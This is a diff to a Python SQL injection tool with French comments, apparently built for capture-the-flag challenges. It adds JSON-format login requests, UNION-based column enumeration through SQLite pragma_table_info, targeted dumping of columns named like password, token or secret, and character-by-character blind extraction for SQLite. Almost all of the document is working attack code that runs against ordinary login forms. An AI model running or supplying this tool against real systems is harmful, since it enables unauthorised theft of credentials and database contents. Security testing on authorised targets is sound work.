@@ -4,6 +4,7 @@ import re
 import argparse
 import time
 import sys
+import json
 
 class SQLInjectionTester:
     def __init__(self, url, delay=1):
@@ -50,12 +51,22 @@ class SQLInjectionTester:
         }
         
     def _send_request(self, payload, password="dummy"):
-        """Envoie une requête avec le payload et retourne la réponse"""
+        """Envoie une requête avec le payload au format JSON et retourne la réponse"""
         try:
-            response = self.session.post(self.url, data={
+            # Créer un payload JSON
+            json_data = {
                 "username": payload,
                 "password": password
-            }, allow_redirects=True)
+            }
+            
+            # Envoyer la requête avec Content-Type: application/json
+            response = self.session.post(
+                self.url, 
+                json=json_data,  # Utilise json= au lieu de data= pour envoyer des données JSON
+                headers={"Content-Type": "application/json"},
+                allow_redirects=True
+            )
+            
             time.sleep(self.delay)  # Pour éviter de surcharger le serveur
             return response
         except Exception as e:
@@ -218,7 +229,20 @@ class SQLInjectionTester:
                         if response:
                             print(f"[*] Structure de {table}:")
                             # Analyser et afficher la structure
-                            # Tenter de récupérer les données...
+                            
+                        # Récupérer les colonnes en utilisant PRAGMA
+                        payload = f"' UNION SELECT group_concat(name) FROM pragma_table_info('{table}') -- "
+                        response = self._send_request(payload)
+                        if response:
+                            columns_pattern = re.compile(r"([a-zA-Z0-9_]+,?)+")
+                            matches = columns_pattern.findall(response.text)
+                            if matches:
+                                potential_columns = [col.strip() for match in matches for col in match.split(',')]
+                                columns = [c for c in potential_columns if len(c) > 2 and not c.lower() in ["div", "span", "html", "body", "head"]]
+                                print(f"[+] Colonnes pour {table}: {', '.join(columns)}")
+                                
+                                # Tenter de récupérer des données
+                                self.dump_data(dbms, table, columns)
 
         return tables
 
@@ -228,31 +252,59 @@ class SQLInjectionTester:
             print("[-] Aucune colonne fournie")
             return
             
-        columns_str = ", ".join(columns)
+        # Recherche de colonnes susceptibles de contenir des flags
+        flag_patterns = ["flag", "key", "secret", "password", "pass", "pwd", "token"]
+        flag_columns = [col for col in columns if any(pattern in col.lower() for pattern in flag_patterns)]
         
-        if dbms == "mysql":
-            payload = f"' UNION SELECT concat({columns_str}) FROM {table} -- "
-        elif dbms == "postgresql":
-            payload = f"' UNION SELECT concat({columns_str}) FROM {table} -- "
-        elif dbms == "sqlite":
-            payload = f"' UNION SELECT {columns_str} FROM {table} -- "
+        if flag_columns:
+            print(f"[*] Colonnes susceptibles de contenir des flags: {', '.join(flag_columns)}")
+            for col in flag_columns:
+                if dbms == "mysql":
+                    payload = f"' UNION SELECT {col} FROM {table} -- "
+                elif dbms == "postgresql":
+                    payload = f"' UNION SELECT {col} FROM {table} -- "
+                elif dbms == "sqlite":
+                    payload = f"' UNION SELECT {col} FROM {table} -- "
+                else:
+                    print(f"[-] Extraction de données non implémentée pour {dbms}")
+                    return
+                    
+                response = self._send_request(payload)
+                if response:
+                    print(f"[*] Données extraites de {table}.{col}:")
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    text = soup.get_text()
+                    
+                    # Recherche de motifs qui pourraient être des flags
+                    flag_regex = r"(flag\{[^}]*\}|CTF\{[^}]*\}|KEY\{[^}]*\})"
+                    flags = re.findall(flag_regex, text, re.IGNORECASE)
+                    if flags:
+                        print(f"[+] FLAG POTENTIEL TROUVÉ: {flags[0]}")
+                    else:
+                        # Afficher un extrait du texte qui pourrait contenir un flag
+                        text_cleaned = ' '.join(text.split())
+                        print(f"[*] Extrait: {text_cleaned[:200]}...")
         else:
-            print(f"[-] Extraction de données non implémentée pour {dbms}")
-            return
-            
-        response = self._send_request(payload)
-        if response:
-            print(f"[*] Données extraites de {table}:")
-            soup = BeautifulSoup(response.text, 'html.parser')
-            text = soup.get_text()
-            # Analyser et afficher les données
-            print(text)
-            
-            # Recherche de motifs qui pourraient être des flags
-            flag_regex = r"(flag\{[^}]*\}|CTF\{[^}]*\}|KEY\{[^}]*\})"
-            flags = re.findall(flag_regex, text, re.IGNORECASE)
-            if flags:
-                print(f"[+] FLAG POTENTIEL TROUVÉ: {flags[0]}")
+            # Si aucune colonne suspecte n'est trouvée, essayer de concaténer toutes les colonnes
+            if dbms == "sqlite":
+                # Construire une chaîne qui concatène toutes les colonnes avec un séparateur
+                columns_concat = " || '|' || ".join(columns)
+                payload = f"' UNION SELECT {columns_concat} FROM {table} LIMIT 10 -- "
+                
+                response = self._send_request(payload)
+                if response:
+                    print(f"[*] Échantillon de données de {table} (premières 10 lignes):")
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    text = soup.get_text()
+                    # Afficher un extrait formaté
+                    text_cleaned = ' '.join(text.split())
+                    print(f"[*] Extrait: {text_cleaned[:200]}...")
+                    
+                    # Recherche de motifs qui pourraient être des flags
+                    flag_regex = r"(flag\{[^}]*\}|CTF\{[^}]*\}|KEY\{[^}]*\})"
+                    flags = re.findall(flag_regex, text, re.IGNORECASE)
+                    if flags:
+                        print(f"[+] FLAG POTENTIEL TROUVÉ: {flags[0]}")
 
     def blind_extraction(self, dbms, table=None, column=None):
         """Tente une extraction par injection aveugle"""
@@ -270,6 +322,27 @@ class SQLInjectionTester:
                     found = False
                     for char in chars:
                         payload = f"' OR (SELECT SUBSTRING({column}, {i}, 1) FROM {table} LIMIT 1)='{char}' -- "
+                        response = self._send_request(payload)
+                        if response and "login successful" in response.text.lower():
+                            result += char
+                            found = True
+                            print(f"\r[+] Extraction en cours: {result}", end="")
+                            break
+                    
+                    if not found:
+                        break
+                    i += 1
+                
+                print(f"\n[+] Valeur extraite: {result}")
+                return result
+            
+            # Pour SQLite
+            elif dbms == "sqlite":
+                i = 1
+                while True:
+                    found = False
+                    for char in chars:
+                        payload = f"' OR (SELECT substr({column}, {i}, 1) FROM {table} LIMIT 1)='{char}' -- "
                         response = self._send_request(payload)
                         if response and "login successful" in response.text.lower():
                             result += char
